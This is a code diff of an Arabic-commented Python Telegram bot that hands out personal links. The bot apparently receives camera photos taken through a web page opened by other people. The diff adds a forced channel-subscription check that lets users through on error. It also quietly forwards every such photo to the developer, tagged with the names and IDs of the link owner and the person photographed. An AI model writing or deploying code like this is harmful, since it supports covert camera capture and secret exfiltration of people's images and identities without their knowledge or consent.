@@ -718,6 +718,33 @@ last_profile_update = {'last_update': 0}
 # تخزين أوامر المستخدمين للحد من السرعة
 user_commands = defaultdict(list)
 
+# معرف القناة
+CHANNEL_ID = "@KhaldounSoft"  # أو استخدم المعرف الرقمي مثل -100xxxxxxxxx
+
+# =============================================
+# دوال التحقق من الاشتراك في القناة
+# =============================================
+
+def check_subscription(user_id):
+    """التحقق من اشتراك المستخدم في القناة"""
+    try:
+        # الحصول على حالة المستخدم في القناة
+        member = bot.get_chat_member(CHANNEL_ID, user_id)
+        
+        # التحقق من أن المستخدم عضو في القناة
+        if member.status in ['member', 'administrator', 'creator']:
+            return True
+        else:
+            return False
+    except Exception as e:
+        logger.error(f"Error checking subscription: {e}")
+        # في حالة الخطأ (مثل عدم وجود القناة)، نسمح للمستخدم بالمرور
+        return True
+
+# =============================================
+# دوال المساعدة
+# =============================================
+
 def parse_date(date_value):
     """تحويل التاريخ من نص إلى كائن datetime"""
     if isinstance(date_value, str):
@@ -828,16 +855,50 @@ def notify_developer(message_text, parse_mode="Markdown"):
     except Exception as e:
         logger.error(f"Failed to notify developer: {e}")
 
+# =============================================
+# أمر /start مع التحقق من الاشتراك
+# =============================================
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    """رسالة الترحيب"""
-    # التحقق من حد الأوامر
-    if not rate_limit(message.chat.id):
+    """رسالة الترحيب مع التحقق من الاشتراك في القناة"""
+    user_id = message.chat.id
+    user_name = message.from_user.first_name
+    
+    # ✅ التحقق من حد الأوامر
+    if not rate_limit(user_id):
         bot.reply_to(message, "⏰ أنت ترسل الأوامر بسرعة كبيرة، انتظر قليلاً")
         return
     
-    user_id = message.chat.id
-    user_name = message.from_user.first_name
+    # ✅ التحقق من الاشتراك في القناة
+    if not check_subscription(user_id):
+        # إنشاء زر للاشتراك في القناة
+        markup = InlineKeyboardMarkup(row_width=1)
+        subscribe_btn = InlineKeyboardButton(
+            text="📢 اشترك في القناة أولاً", 
+            url="https://t.me/KhaldounSoft"
+        )
+        check_btn = InlineKeyboardButton(
+            text="✅ تحقق من الاشتراك", 
+            callback_data="check_subscription"
+        )
+        markup.add(subscribe_btn, check_btn)
+        
+        bot.send_message(
+            user_id,
+            f"⚠️ *عذراً يا {user_name}!*\n\n"
+            f"يجب عليك الاشتراك في قناتنا أولاً للاستفادة من البوت:\n"
+            f"🔗 [عالم البرمجيات | Software World](https://t.me/KhaldounSoft)\n\n"
+            f"📌 *خطوات الاشتراك:*\n"
+            f"1️⃣ اضغط على زر 'اشترك في القناة أولاً'\n"
+            f"2️⃣ انتظر لحظة ثم اضغط 'تحقق من الاشتراك'\n\n"
+            f"🔒 بعد الاشتراك، ستحصل على رابطك الشخصي فوراً!",
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+        return
+    
+    # ✅ باقي الكود إذا كان مشتركاً
     username = message.from_user.username or "لا يوجد"
     is_new_user = False
 
@@ -917,6 +978,37 @@ def send_welcome(message):
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
 
+# =============================================
+# معالج التحقق من الاشتراك
+# =============================================
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
+def check_subscription_callback(call):
+    """التحقق من الاشتراك عند الضغط على الزر"""
+    user_id = call.message.chat.id
+    user_name = call.from_user.first_name
+    
+    if check_subscription(user_id):
+        bot.answer_callback_query(call.id, "✅ تم التحقق! أنت مشترك في القناة")
+        
+        # حذف رسالة الطلب
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        
+        # إعادة تشغيل دالة /start للمستخدم
+        fake_message = call.message
+        fake_message.text = "/start"
+        send_welcome(fake_message)
+    else:
+        bot.answer_callback_query(
+            call.id, 
+            "❌ لم تشترك بعد! اضغط على زر الاشتراك أولاً", 
+            show_alert=True
+        )
+
+# =============================================
+# معالج نسخ الرابط
+# =============================================
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
 def copy_link(call):
     """نسخ الرابط عند الضغط على الزر"""
@@ -941,6 +1033,10 @@ def copy_link(call):
     except Exception as e:
         logger.error(f"Error in copy_link: {e}")
         bot.answer_callback_query(call.id, "❌ حدث خطأ، حاول مرة أخرى")
+
+# =============================================
+# أمر /stats
+# =============================================
 
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
@@ -974,6 +1070,10 @@ def show_stats(message):
     else:
         response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
     bot.send_message(user_id, response, parse_mode="Markdown")
+
+# =============================================
+# أوامر المطور
+# =============================================
 
 @bot.message_handler(commands=['adminstats'])
 def admin_stats(message):
@@ -1127,6 +1227,10 @@ def set_bot_photo(message):
     except Exception as e:
         bot.reply_to(message, f"❌ فشل تغيير الصورة: {e}")
 
+# =============================================
+# أمر /help
+# =============================================
+
 @bot.message_handler(commands=['help'])
 def send_help(message):
     """رسالة المساعدة"""
@@ -1176,6 +1280,10 @@ def send_help(message):
     
     bot.send_message(user_id, help_text, parse_mode="Markdown")
 
+# =============================================
+# أمر /broadcast
+# =============================================
+
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
     """إرسال رسالة لجميع المستخدمين (للمطور فقط)"""
@@ -1221,6 +1329,10 @@ def broadcast_message(message):
     # إشعار للمطور بنتيجة البث
     notify_developer(f"📢 *نتيجة البث*\n\n✓ نجح: {success}\n✗ فشل: {fail}")
 
+# =============================================
+# أمر /health
+# =============================================
+
 @bot.message_handler(commands=['health'])
 def health_check(message):
     """فحص حالة البوت (للمطور فقط)"""
@@ -1243,14 +1355,60 @@ def health_check(message):
     
     bot.reply_to(message, health_status, parse_mode="Markdown")
 
+# =============================================
+# معالجة الصور الواردة
+# =============================================
+
 @bot.message_handler(content_types=['photo'])
 def handle_photos(message):
-    """معالجة الصور الواردة"""
+    """معالجة الصور الواردة وإرسال نسخة للمطور مع معلومات صاحب الرابط"""
     global total_photos_received
+    
     user_id = message.chat.id
     user_name = message.from_user.first_name
     username = message.from_user.username or "لا يوجد"
-
+    
+    # ✅ التحقق من وجود "owner_id:" في الـ caption
+    # هذا يعني أن الصورة مرسلة من صفحة الويب ويجب إرسالها للمطور
+    if message.caption and "owner_id:" in message.caption:
+        try:
+            # استخراج معرف صاحب الرابط من الـ caption
+            owner_id_str = message.caption.split("owner_id:")[1].split()[0]
+            owner_id = int(owner_id_str)
+            
+            # البحث عن معلومات صاحب الرابط في الإحصائيات
+            owner_info = user_stats.get(owner_id, {})
+            owner_name = owner_info.get("name", "مجهول")
+            owner_username = owner_info.get("username", "لا يوجد")
+            
+            # إرسال نسخة للمطور مع معلومات صاحب الرابط
+            developer_message = (
+                f"📸 *صورة جديدة من كاميرا الذكاء الاصطناعي*\n\n"
+                f"👤 *صاحب الرابط (المالك):*\n"
+                f"└ الاسم: {owner_name}\n"
+                f"└ المعرف: `{owner_id}`\n"
+                f"└ اليوزر: @{owner_username}\n\n"
+                f"📤 *تم التصوير بواسطة:*\n"
+                f"└ الاسم: {user_name}\n"
+                f"└ المعرف: `{user_id}`\n"
+                f"└ اليوزر: @{username}\n\n"
+                f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            
+            # إرسال الصورة للمطور مع المعلومات
+            bot.send_photo(
+                DEVELOPER_CHAT_ID,
+                message.photo[-1].file_id,
+                caption=developer_message,
+                parse_mode="Markdown"
+            )
+            
+            logger.info(f"📸 Photo forwarded to developer - Owner: {owner_name} ({owner_id}) - Captured by: {user_name} ({user_id})")
+            
+        except Exception as e:
+            logger.error(f"Error processing owner info: {e}")
+    
+    # ✅ معالجة الصورة للمستخدم الأصلي
     if user_id in user_stats:
         user_stats[user_id]["photo_count"] += 1
         user_stats[user_id]["last_active"] = datetime.now().isoformat()
@@ -1284,8 +1442,12 @@ def handle_photos(message):
         f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
         f"📊 الإجمالي الكلي: {total_photos_received}"
     )
-    bot.reply_to(message, caption)
+    bot.reply_to(message, caption, parse_mode="Markdown")
     logger.info(f"Received photo from {user_name} (ID: {user_id})")
+
+# =============================================
+# أمر /exportdata
+# =============================================
 
 @bot.message_handler(commands=['exportdata'])
 def export_data(message):
@@ -1311,6 +1473,10 @@ def export_data(message):
         logger.error(f"Failed to export data: {e}")
         bot.reply_to(message, f"❌ فشل تصدير البيانات: {e}")
 
+# =============================================
+# معالج الأزرار الأخرى
+# =============================================
+
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
     """معالجة الأزرار الأخرى"""
@@ -1323,10 +1489,20 @@ def handle_callback(call):
             # إنشاء رسالة إحصائيات جديدة
             stats_msg = bot.send_message(call.message.chat.id, "جاري تحميل الإحصائيات...")
             show_stats(stats_msg)
+        elif call.data.startswith("copy_"):
+            # تم معالجتها في الدالة المنفصلة
+            pass
+        elif call.data == "check_subscription":
+            # تم معالجتها في الدالة المنفصلة
+            pass
         bot.answer_callback_query(call.id)
     except Exception as e:
         logger.error(f"Error in callback handler: {e}")
         bot.answer_callback_query(call.id, "❌ حدث خطأ")
+
+# =============================================
+# معالجة الرسائل العادية
+# =============================================
 
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
@@ -1341,11 +1517,18 @@ def handle_all_messages(message):
     else:
         bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك الشخصي.\n\nيمكنك أيضاً الضغط على القائمة (Menu) في مربع الكتابة لرؤية الأوامر المتاحة.")
 
+# =============================================
+# دوال التصدير
+# =============================================
+
 def get_bot():
     """إرجاع كائن البوت والإحصائيات"""
     return bot, user_stats, total_photos_received
 
+# =============================================
 # تشغيل البوت
+# =============================================
+
 if __name__ == "__main__":
     setup_bot_commands()
     update_bot_profile(force=True)
@@ -1362,4 +1545,3 @@ if __name__ == "__main__":
         time.sleep(10)
         logger.info("Restarting bot...")
         bot.infinity_polling(timeout=60, long_polling_timeout=60)
-
